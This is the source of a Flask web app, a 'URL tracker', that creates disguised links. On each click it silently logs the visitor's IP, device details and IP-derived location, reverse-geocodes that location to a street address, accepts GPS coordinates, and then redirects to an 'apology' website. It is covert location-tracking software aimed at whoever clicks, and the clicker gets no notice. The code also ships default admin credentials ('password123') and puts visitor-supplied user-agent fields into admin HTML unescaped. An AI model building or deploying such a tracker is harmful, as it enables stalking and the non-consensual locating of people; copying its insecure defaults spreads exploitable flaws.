from flask import Flask, render_template_string, redirect, url_for, request, jsonify, g, session
import uuid
import requests
import sqlite3
import os
import json
import hashlib
import time
from datetime import datetime
from functools import wraps
from user_agents import parse

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-in-production')

# Admin credentials (change these!)
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'password123')

# Redirect URL (your enhanced apology website!)
REDIRECT_URL = 'https://apology-7duy.onrender.com'

# Production configuration
if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RENDER') or os.environ.get('PORT'):
    app.config['DEBUG'] = False
    DATABASE = '/tmp/events.db' if os.environ.get('RENDER') else 'events.db'
else:
    app.config['DEBUG'] = True
    DATABASE = 'events.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    """Initialize enhanced database with comprehensive user tracking"""
    try:
        with app.app_context():
            db = sqlite3.connect(DATABASE)
            
            # Drop old table if exists and create new enhanced one
            db.execute('DROP TABLE IF EXISTS events')
            
            # Create comprehensive events table
            db.execute('''CREATE TABLE events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip_address TEXT,
                user_agent TEXT,
                browser TEXT,
                os TEXT,
                device_type TEXT,
                device_brand TEXT,
                country TEXT,
                region TEXT,
                city TEXT,
                timezone TEXT,
                latitude TEXT,
                longitude TEXT,
                accuracy TEXT,
                altitude TEXT,
                speed TEXT,
                heading TEXT,
                location_source TEXT,
                address TEXT,
                isp TEXT,
                organization TEXT,
                referrer TEXT,
                language TEXT,
                screen_resolution TEXT,
                viewport_size TEXT,
                connection_type TEXT,
                battery_level TEXT,
                online_status TEXT,
                timestamp TEXT,
                response_time_ms INTEGER
            )''')
            
            # Create links table for better tracking
            db.execute('''CREATE TABLE links (
                id TEXT PRIMARY KEY,
                created_at TEXT,
                click_count INTEGER DEFAULT 0,
                last_clicked TEXT
            )''')
            
            db.commit()
            db.close()
            print(f"Enhanced database initialized successfully at {DATABASE}")
    except Exception as e:
        print(f"Error initializing database: {e}")

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def require_auth(f):
    """Decorator for admin authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'authenticated' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Initialize database
init_db()

# Enhanced Homepage Template with Beautiful UI
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ Lightning URL Tracker</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
            max-width: 600px;
            width: 90%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .subtitle {
            font-size: 1.1rem;
            color: #666;
            margin-bottom: 30px;
        }
        
        .create-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }
        
        .create-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
        }
        
        .link-result {
            margin: 30px 0;
            padding: 20px;
            background: linear-gradient(135deg, #e8f5e8, #d4edda);
            border-radius: 15px;
            border-left: 5px solid #28a745;
        }
        
        .generated-link {
            background: rgba(255, 255, 255, 0.8);
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }
        
        .copy-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 20px;
            cursor: pointer;
            margin-left: 10px;
            transition: all 0.3s ease;
        }
        
        .copy-btn:hover {
            background: #218838;
            transform: scale(1.05);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.7);
            padding: 20px;
            border-radius: 15px;
            border-left: 4px solid #667eea;
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9rem;
            margin-top: 5px;
        }
        
        .features {
            margin: 30px 0;
            text-align: left;
        }
        
        .feature-item {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #555;
        }
        
        .feature-icon {
            margin-right: 10px;
            font-size: 1.2rem;
        }
        
        .footer-note {
            margin-top: 30px;
            font-size: 0.9rem;
            color: #888;
            border-top: 1px solid rgba(0,0,0,0.1);
            padding-top: 20px;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 20px;
                margin: 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .create-btn {
                padding: 12px 30px;
                font-size: 1rem;
            }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ Lightning URL Tracker</h1>
        <p class="subtitle">Create trackable links and gather comprehensive visitor analytics</p>
        
        <form method="post" action="/create_link">
            <button type="submit" class="create-btn pulse">🚀 Generate Tracking Link</button>
        </form>
        
        {% if link_url %}
        <div class="link-result">
            <h3>✅ Your Tracking Link is Ready!</h3>
            <div class="generated-link">
                <span id="linkText">{{ link_url }}</span>
                <button class="copy-btn" onclick="copyToClipboard()">📋 Copy</button>
            </div>
            <p style="color: #666; margin-top: 10px;">
                Share this link to track clicks and gather visitor data!
            </p>
        </div>
        {% endif %}
        
        {% if total_links > 0 %}
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">{{ total_links }}</div>
                <div class="stat-label">Total Links Created</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ total_clicks }}</div>
                <div class="stat-label">Total Clicks Tracked</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ total_visitors }}</div>
                <div class="stat-label">Unique Visitors</div>
            </div>
        </div>
        {% endif %}
        
        <div class="features">
            <h3 style="text-align: center; margin-bottom: 20px;">🎯 What We Track</h3>
            <div class="feature-item">
                <span class="feature-icon">🌍</span>
                <span>Precise GPS location (with permission) + IP geolocation</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">💻</span>
                <span>Device info: Browser, OS, screen resolution</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">🔍</span>
                <span>User behavior: Referrer, language, connection type</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">⚡</span>
                <span>Performance: Response times and loading speeds</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">🛡️</span>
                <span>Privacy-conscious with secure data handling</span>
            </div>
        </div>
        
        <div class="footer-note">
            <p>🔒 All data is collected ethically and securely stored. Users are redirected to an interactive experience!</p>
        </div>
    </div>
    
    <script>
        function copyToClipboard() {
            const linkText = document.getElementById('linkText').textContent;
            navigator.clipboard.writeText(linkText).then(function() {
                const btn = document.querySelector('.copy-btn');
                btn.textContent = '✅ Copied!';
                btn.style.background = '#28a745';
                setTimeout(() => {
                    btn.textContent = '📋 Copy';
                    btn.style.background = '#28a745';
                }, 2000);
            });
        }
        
        // Add some interactive effects
        document.addEventListener('DOMContentLoaded', function() {
            const statCards = document.querySelectorAll('.stat-card');
            statCards.forEach((card, index) => {
                setTimeout(() => {
                    card.style.opacity = '0';
                    card.style.transform = 'translateY(20px)';
                    card.style.transition = 'all 0.5s ease';
                    setTimeout(() => {
                        card.style.opacity = '1';
                        card.style.transform = 'translateY(0)';
                    }, 100);
                }, index * 200);
            });
        });
    </script>
</body>
</html>
'''

# Login Template
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Admin Login - URL Tracker</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        
        .login-header {
            font-size: 2rem;
            margin-bottom: 30px;
            color: #333;
        }
        
        .form-group {
            margin: 20px 0;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }
        
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .login-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.1rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            margin-top: 20px;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .error {
            background: #ffe6e6;
            color: #d63384;
            padding: 10px;
            border-radius: 10px;
            margin: 15px 0;
            border: 1px solid #f5c6cb;
        }
        
        .back-link {
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
        }
        
        .back-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">🔐 Admin Access</div>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <form method="post">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="login-btn">🚀 Access Dashboard</button>
        </form>
        
        <a href="/" class="back-link">← Back to Home</a>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET'])
def home():
    """Enhanced homepage with statistics"""
    start_time = time.time()
    
    try:
        db = get_db()
        
        # Get statistics
        total_links = db.execute('SELECT COUNT(*) FROM links').fetchone()[0]
        total_clicks = db.execute('SELECT SUM(click_count) FROM links').fetchone()[0] or 0
        total_visitors = db.execute('SELECT COUNT(DISTINCT ip_address) FROM events').fetchone()[0]
        
        response_time = int((time.time() - start_time) * 1000)
        
        return render_template_string(HOME_TEMPLATE,
            link_url=request.args.get('link'),
            total_links=total_links,
            total_clicks=total_clicks,
            total_visitors=total_visitors,
            response_time=response_time
        )
    except Exception as e:
        print(f"Error loading homepage: {e}")
        return render_template_string(HOME_TEMPLATE)

@app.route('/create_link', methods=['POST'])
def create_link():
    """Create a new tracking link"""
    try:
        link_id = str(uuid.uuid4())[:8]
        
        db = get_db()
        db.execute('INSERT INTO links (id, created_at) VALUES (?, ?)',
                  (link_id, datetime.utcnow().isoformat()))
        db.commit()
        
        link_url = request.url_root + f'l/{link_id}'
        return redirect(url_for('home') + f'?link={link_url}')
        
    except Exception as e:
        print(f"Error creating link: {e}")
        return redirect(url_for('home'))

@app.route('/l/<link_id>')
def track_and_redirect(link_id):
    """Enhanced tracking with comprehensive data collection and direct redirect"""
    start_time = time.time()
    
    try:
        # Get client information
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = parse(user_agent_string)
        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # Get comprehensive client data
        client_data = {
            'link_id': link_id,
            'ip_address': client_ip,
            'user_agent': user_agent_string,
            'browser': f"{user_agent.browser.family} {user_agent.browser.version_string}",
            'os': f"{user_agent.os.family} {user_agent.os.version_string}",
            'device_type': user_agent.device.family,
            'device_brand': user_agent.device.brand or 'Unknown',
            'referrer': request.headers.get('Referer', 'Direct'),
            'language': request.headers.get('Accept-Language', '').split(',')[0] if request.headers.get('Accept-Language') else 'Unknown',
            'timestamp': datetime.utcnow().isoformat(),
            'response_time_ms': 0  # Will be updated after processing
        }
        
        # Get IP geolocation
        geo_data = get_ip_geolocation(client_ip)
        client_data.update({
            'country': geo_data.get('country_name', 'Unknown'),
            'region': geo_data.get('region_name', 'Unknown'),
            'city': geo_data.get('city', 'Unknown'),
            'timezone': geo_data.get('timezone', 'Unknown'),
            'latitude': str(geo_data.get('latitude', 'Unknown')),
            'longitude': str(geo_data.get('longitude', 'Unknown')),
            'location_source': 'ip_geolocation',
            'isp': geo_data.get('isp', 'Unknown'),
            'organization': geo_data.get('org', 'Unknown')
        })
        
        # Get address from coordinates if available
        if client_data['latitude'] != 'Unknown' and client_data['longitude'] != 'Unknown':
            try:
                address = get_address_from_coords(client_data['latitude'], client_data['longitude'])
                client_data['address'] = address
            except:
                client_data['address'] = 'Address lookup failed'
        
        # Calculate response time
        client_data['response_time_ms'] = int((time.time() - start_time) * 1000)
        
        # Save to database
        db = get_db()
        
        # Insert comprehensive event data
        columns = ', '.join(client_data.keys())
        placeholders = ', '.join(['?'] * len(client_data))
        query = f'INSERT INTO events ({columns}) VALUES ({placeholders})'
        
        db.execute(query, list(client_data.values()))
        
        # Update link click count
        db.execute('UPDATE links SET click_count = click_count + 1, last_clicked = ? WHERE id = ?',
                  (datetime.utcnow().isoformat(), link_id))
        
        db.commit()
        
        print(f"[Track] {client_ip} clicked {link_id} - Response: {client_data['response_time_ms']}ms")
        
        # Direct redirect to your apology website (no intermediate page)
        return redirect(REDIRECT_URL)
        
    except Exception as e:
        print(f"Error tracking click: {e}")
        # Still redirect even if tracking fails
        return redirect(REDIRECT_URL)

@app.route('/save_location', methods=['POST'])
def save_precise_location():
    """Save precise GPS location from browser"""
    try:
        data = request.json
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy')
        altitude = data.get('altitude')
        speed = data.get('speed')
        heading = data.get('heading')
        
        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # Update the most recent event for this IP with precise GPS data
        db = get_db()
        
        address = get_address_from_coords(latitude, longitude)
        
        # Update latest event from this IP with GPS data
        db.execute('''UPDATE events SET 
                     latitude = ?, longitude = ?, accuracy = ?, altitude = ?,
                     speed = ?, heading = ?, location_source = ?, address = ?
                     WHERE ip_address = ? AND id = (
                         SELECT MAX(id) FROM events WHERE ip_address = ?
                     )''', 
                  (str(latitude), str(longitude), str(accuracy), str(altitude),
                   str(speed), str(heading), 'browser_gps', address,
                   client_ip, client_ip))
        
        db.commit()
        
        return jsonify({
            'status': 'success',
            'latitude': latitude,
            'longitude': longitude,
            'address': address,
            'source': 'browser_gps'
        })
        
    except Exception as e:
        print(f"Error saving precise location: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Admin login"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error="Invalid credentials")
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    """Admin logout"""
    session.pop('authenticated', None)
    return redirect(url_for('home'))

@app.route('/admin')
@require_auth
def admin_dashboard():
    """Comprehensive admin dashboard"""
    try:
        db = get_db()
        
        # Get comprehensive statistics
        total_events = db.execute('SELECT COUNT(*) FROM events').fetchone()[0]
        total_links = db.execute('SELECT COUNT(*) FROM links').fetchone()[0]
        total_clicks = db.execute('SELECT SUM(click_count) FROM links').fetchone()[0] or 0
        unique_ips = db.execute('SELECT COUNT(DISTINCT ip_address) FROM events').fetchone()[0]
        unique_countries = db.execute('SELECT COUNT(DISTINCT country) FROM events WHERE country != "Unknown"').fetchone()[0]
        
        # Get recent events (last 50)
        events = db.execute('''SELECT * FROM events 
                              ORDER BY id DESC LIMIT 50''').fetchall()
        
        # Get top countries
        top_countries = db.execute('''SELECT country, COUNT(*) as count 
                                     FROM events 
                                     WHERE country != "Unknown" 
                                     GROUP BY country 
                                     ORDER BY count DESC 
                                     LIMIT 10''').fetchall()
        
        # Get top browsers
        top_browsers = db.execute('''SELECT browser, COUNT(*) as count 
                                    FROM events 
                                    GROUP BY browser 
                                    ORDER BY count DESC 
                                    LIMIT 10''').fetchall()
        
        # Get performance stats
        avg_response_time = db.execute('SELECT AVG(response_time_ms) FROM events WHERE response_time_ms > 0').fetchone()[0] or 0
        
        dashboard_html = f'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>📊 Admin Dashboard - URL Tracker</title>
            <style>
                * {{
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }}
                
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: #f8f9fa;
                    color: #333;
                }}
                
                .header {{
                    background: linear-gradient(135deg, #667eea, #764ba2);
                    color: white;
                    padding: 20px;
                    text-align: center;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                }}
                
                .container {{
                    max-width: 1400px;
                    margin: 0 auto;
                    padding: 30px 20px;
                }}
                
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                    gap: 20px;
                    margin-bottom: 40px;
                }}
                
                .stat-card {{
                    background: white;
                    padding: 25px;
                    border-radius: 15px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
                    border-left: 5px solid #667eea;
                    transition: transform 0.2s ease;
                }}
                
                .stat-card:hover {{
                    transform: translateY(-5px);
                }}
                
                .stat-number {{
                    font-size: 2.5rem;
                    font-weight: bold;
                    color: #667eea;
                    margin-bottom: 5px;
                }}
                
                .stat-label {{
                    color: #666;
                    font-size: 0.9rem;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                }}
                
                .section {{
                    background: white;
                    margin: 30px 0;
                    border-radius: 15px;
                    overflow: hidden;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
                }}
                
                .section-header {{
                    background: #667eea;
                    color: white;
                    padding: 20px;
                    font-size: 1.3rem;
                    font-weight: 600;
                }}
                
                .table-container {{
                    overflow-x: auto;
                    max-height: 600px;
                    overflow-y: auto;
                }}
                
                table {{
                    width: 100%;
                    border-collapse: collapse;
                }}
                
                th, td {{
                    padding: 12px;
                    text-align: left;
                    border-bottom: 1px solid #e0e0e0;
                    font-size: 0.9rem;
                }}
                
                th {{
                    background: #f8f9fa;
                    font-weight: 600;
                    position: sticky;
                    top: 0;
                }}
                
                tr:hover {{
                    background: #f8f9fa;
                }}
                
                .actions {{
                    padding: 20px;
                    text-align: center;
                    background: #f8f9fa;
                }}
                
                .btn {{
                    background: #667eea;
                    color: white;
                    padding: 12px 24px;
                    border: none;
                    border-radius: 25px;
                    text-decoration: none;
                    margin: 0 10px;
                    display: inline-block;
                    transition: all 0.3s ease;
                    cursor: pointer;
                }}
                
                .btn:hover {{
                    background: #5a6fd8;
                    transform: translateY(-2px);
                }}
                
                .btn.secondary {{
                    background: #6c757d;
                }}
                
                .btn.secondary:hover {{
                    background: #5a6268;
                }}
                
                .charts-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
                    gap: 30px;
                    margin: 30px 0;
                }}
                
                .chart {{
                    background: white;
                    padding: 25px;
                    border-radius: 15px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
                }}
                
                .chart h3 {{
                    margin-bottom: 20px;
                    color: #333;
                    border-bottom: 2px solid #667eea;
                    padding-bottom: 10px;
                }}
                
                .chart-item {{
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    padding: 8px 0;
                    border-bottom: 1px solid #f0f0f0;
                }}
                
                .chart-label {{
                    flex: 1;
                    font-weight: 500;
                }}
                
                .chart-value {{
                    background: #667eea;
                    color: white;
                    padding: 4px 12px;
                    border-radius: 15px;
                    font-size: 0.9rem;
                    font-weight: 600;
                }}
                
                .status-indicator {{
                    display: inline-block;
                    width: 10px;
                    height: 10px;
                    border-radius: 50%;
                    margin-right: 8px;
                }}
                
                .status-online {{
                    background: #28a745;
                }}
                
                .status-offline {{
                    background: #dc3545;
                }}
                
                .location-source {{
                    padding: 4px 8px;
                    border-radius: 10px;
                    font-size: 0.8rem;
                    font-weight: 600;
                }}
                
                .source-gps {{
                    background: #d4edda;
                    color: #155724;
                }}
                
                .source-ip {{
                    background: #d1ecf1;
                    color: #0c5460;
                }}
                
                @media (max-width: 768px) {{
                    .container {{
                        padding: 20px 10px;
                    }}
                    
                    .stats-grid {{
                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    }}
                    
                    .charts-grid {{
                        grid-template-columns: 1fr;
                    }}
                }}
                
                .auto-refresh {{
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    background: rgba(255,255,255,0.9);
                    padding: 10px 15px;
                    border-radius: 25px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                    font-size: 0.9rem;
                    color: #28a745;
                }}
            </style>
            <script>
                // Auto-refresh every 60 seconds
                setTimeout(() => location.reload(), 60000);
                
                function exportData() {{
                    window.open('/admin/export', '_blank');
                }}
            </script>
        </head>
        <body>
            <div class="auto-refresh">
                🔄 Auto-refresh: 60s
            </div>
            
            <div class="header">
                <h1>📊 Lightning URL Tracker Dashboard</h1>
                <p>Comprehensive analytics and visitor tracking</p>
            </div>
            
            <div class="container">
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{total_events}</div>
                        <div class="stat-label">Total Events</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{total_links}</div>
                        <div class="stat-label">Links Created</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{total_clicks}</div>
                        <div class="stat-label">Total Clicks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{unique_ips}</div>
                        <div class="stat-label">Unique Visitors</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{unique_countries}</div>
                        <div class="stat-label">Countries</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{avg_response_time:.0f}ms</div>
                        <div class="stat-label">Avg Response Time</div>
                    </div>
                </div>
                
                <div class="charts-grid">
                    <div class="chart">
                        <h3>🌍 Top Countries</h3>
        '''
        
        for country, count in top_countries:
            dashboard_html += f'''
                        <div class="chart-item">
                            <div class="chart-label">{country}</div>
                            <div class="chart-value">{count}</div>
                        </div>
            '''
        
        dashboard_html += '''
                    </div>
                    
                    <div class="chart">
                        <h3>🌐 Top Browsers</h3>
        '''
        
        for browser, count in top_browsers:
            dashboard_html += f'''
                        <div class="chart-item">
                            <div class="chart-label">{browser}</div>
                            <div class="chart-value">{count}</div>
                        </div>
            '''
        
        dashboard_html += '''
                    </div>
                </div>
                
                <div class="section">
                    <div class="section-header">
                        📊 Recent Events (Last 50)
                    </div>
                    <div class="table-container">
                        <table>
                            <thead>
                                <tr>
                                    <th>IP Address</th>
                                    <th>Location</th>
                                    <th>Device/Browser</th>
                                    <th>Location Source</th>
                                    <th>Response Time</th>
                                    <th>Timestamp</th>
                                </tr>
                            </thead>
                            <tbody>
        '''
        
        for event in events:
            location_display = f"{event['city']}, {event['country']}" if event['city'] != 'Unknown' else event['country']
            device_display = f"{event['browser']} on {event['os']}"
            
            source_class = 'source-gps' if event['location_source'] == 'browser_gps' else 'source-ip'
            source_icon = '📱' if event['location_source'] == 'browser_gps' else '🌐'
            source_text = 'GPS' if event['location_source'] == 'browser_gps' else 'IP'
            
            response_time = f"{event['response_time_ms']}ms" if event['response_time_ms'] else 'N/A'
            
            timestamp = datetime.fromisoformat(event['timestamp']).strftime('%Y-%m-%d %H:%M:%S') if event['timestamp'] else 'N/A'
            
            dashboard_html += f'''
                                <tr>
                                    <td>{event['ip_address']}</td>
                                    <td>{location_display}</td>
                                    <td>{device_display}</td>
                                    <td><span class="location-source {source_class}">{source_icon} {source_text}</span></td>
                                    <td>{response_time}</td>
                                    <td>{timestamp}</td>
                                </tr>
            '''
        
        dashboard_html += f'''
                            </tbody>
                        </table>
                    </div>
                    <div class="actions">
                        <button onclick="exportData()" class="btn">📥 Export Data</button>
                        <a href="/admin/detailed" class="btn">🔍 Detailed View</a>
                        <a href="/logout" class="btn secondary">🚪 Logout</a>
                        <a href="/" class="btn secondary">🏠 Home</a>
                    </div>
                </div>
            </div>
        </body>
        </html>
        '''
        
        return dashboard_html
        
    except Exception as e:
        return f"<h2>Dashboard Error</h2><p>{e}</p><br><a href='/logout'>Logout</a>"

def get_ip_geolocation(ip):
    """Enhanced IP geolocation with multiple data points"""
    if ip in ['127.0.0.1', 'localhost'] or ip.startswith(('192.168.', '10.', '172.')):
        return {
            'city': 'Local Network',
            'region_name': 'Private Network', 
            'country_name': 'Local',
            'latitude': '0',
            'longitude': '0',
            'timezone': 'Local',
            'isp': 'Local ISP',
            'org': 'Private Network'
        }
    
    apis = [
        {
            'url': f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org',
            'city_key': 'city',
            'region_key': 'regionName',
            'country_key': 'country',
            'lat_key': 'lat',
            'lng_key': 'lon',
            'timezone_key': 'timezone',
            'isp_key': 'isp',
            'org_key': 'org'
        }
    ]
    
    for api in apis:
        try:
            response = requests.get(api['url'], timeout=5)
            data = response.json()
            
            if data.get('status') == 'success':
                return {
                    'city': data.get(api['city_key'], 'Unknown'),
                    'region_name': data.get(api['region_key'], 'Unknown'),
                    'country_name': data.get(api['country_key'], 'Unknown'),
                    'latitude': str(data.get(api['lat_key'], 'Unknown')),
                    'longitude': str(data.get(api['lng_key'], 'Unknown')),
                    'timezone': data.get(api['timezone_key'], 'Unknown'),
                    'isp': data.get(api['isp_key'], 'Unknown'),
                    'org': data.get(api['org_key'], 'Unknown')
                }
        except Exception as e:
            print(f"Geolocation API error: {e}")
            continue
    
    return {
        'city': 'Unknown',
        'region_name': 'Unknown',
        'country_name': 'Unknown',
        'latitude': 'Unknown',
        'longitude': 'Unknown',
        'timezone': 'Unknown',
        'isp': 'Unknown',
        'org': 'Unknown'
    }

def get_address_from_coords(lat, lng):
    """Get address from coordinates"""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18"
        headers = {'User-Agent': 'LightningURLTracker/2.0'}
        response = requests.get(url, headers=headers, timeout=5)
        data = response.json()
        return data.get('display_name', 'Address not found')
    except:
        return 'Address unavailable'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port) 